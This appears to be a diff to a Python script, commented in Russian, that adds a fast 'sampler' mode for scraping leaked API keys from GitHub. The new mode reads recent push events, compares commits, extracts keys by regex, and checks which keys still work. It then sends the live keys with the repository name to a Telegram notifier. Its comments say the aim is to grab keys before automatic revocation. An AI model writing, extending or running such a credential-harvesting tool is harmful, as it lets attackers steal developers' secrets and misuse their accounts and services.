@@ -191,9 +191,53 @@ def run_cycle(hours_ago):
         json.dump(old + new, open(LIVE_FILE, "w", encoding="utf-8"), indent=1)
     print(f"[*] проверено ключей: {len(seen)}, ЖИВЫХ новых: {len(new)}", flush=True)
 
+def run_sampler():
+    """Быстрый канал: срез свежих пушей из /events (почти реальное время).
+    Ловит ключи в первые минуты — до автоотзыва. Покрытие частичное, зато горячее."""
+    print("[*] sampler: срез свежих пушей", flush=True)
+    try:
+        r = http("https://api.github.com/events?per_page=100", timeout=20)
+        events = json.loads(r.read())
+    except Exception as e:
+        print(f"[!] events: {e}", flush=True)
+        return
+    live, seen = [], set()
+    tested = 0
+    for ev in events:
+        if ev.get("type") != "PushEvent":
+            continue
+        repo = ev.get("repo", {}).get("name", "")
+        pl = ev.get("payload", {})
+        before, head = pl.get("before"), pl.get("head")
+        if not (repo and before and head and before != head):
+            continue
+        try:
+            r = http(f"https://api.github.com/repos/{repo}/compare/{before}...{head}", timeout=10)
+            data = json.loads(r.read())
+        except Exception:
+            continue
+        tested += 1
+        for f in data.get("files", []) or []:
+            patch = f.get("patch")
+            if not patch:
+                continue
+            for k in set(PAT.findall(patch)):
+                if k in seen or re.search(r"\.{2,}|xxxx|your|example|here", k, re.I):
+                    continue
+                seen.add(k)
+                if validate(k):
+                    live.append({"key": k, "repo": repo, "head": head, "src": "sampler"})
+                    print(f"*** LIVE (sampler): {k} ({repo})", flush=True)
+                    tg_notify(f"LIVE KEY (свежее, sampler)\n{k}\nrepo: {repo}")
+    print(f"[*] sampler: пушей проверено {tested}, живых {len(live)}", flush=True)
+
+
 def main():
     if "--once" in sys.argv:
         run_cycle(4)  # запас 4 часа: дамп точно дописан
+        return
+    if "--sampler" in sys.argv:
+        run_sampler()
         return
     # бесконечный цикл: обрабатываем свежие часы непрерывно
     while True:
